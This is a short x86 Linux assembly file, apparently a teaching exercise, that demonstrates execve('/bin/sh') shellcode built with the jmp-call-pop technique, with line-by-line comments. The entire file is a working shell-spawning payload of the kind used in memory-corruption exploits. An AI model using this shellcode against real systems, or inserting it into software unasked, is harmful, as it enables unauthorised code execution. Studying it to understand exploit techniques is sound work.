; Filename: execve-sh_JmpCallPop.asm
; Author: Cameron, James
; Purpose: Demonstrate execve /bin/sh shellcode using jmp call pop technique
; Tested On: Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
;            Ubuntu 12.04.4 LTS



section .text

global _start

_start:

	jmp short call_shellcode

shellcode:
	    ; int execve(const char *filename, char *const argv[],
            ;            char *const envp[]);
            ; #define __NR_execve              11

	pop esi                ; pop /bin/shABBBBCCCC into esi
	xor eax, eax           ; set eax = 0
	mov [esi + 7], al      ; null terminate /bin/sh string
	mov [esi + 8], esi     ; mov address of esi into BBBB for argv
	mov [esi + 12], eax    ; null terminate argv and envp

	mov al, 0xb            ; execve syscall
	lea ebx, [esi]         ; filename
	lea ecx, [esi + 8]     ; argv
        lea edx, [esi + 12]    ; envp
	int 0x80               ; execute syscall


call_shellcode:
	call shellcode
	buf: db "/bin/shABBBBCCCC"
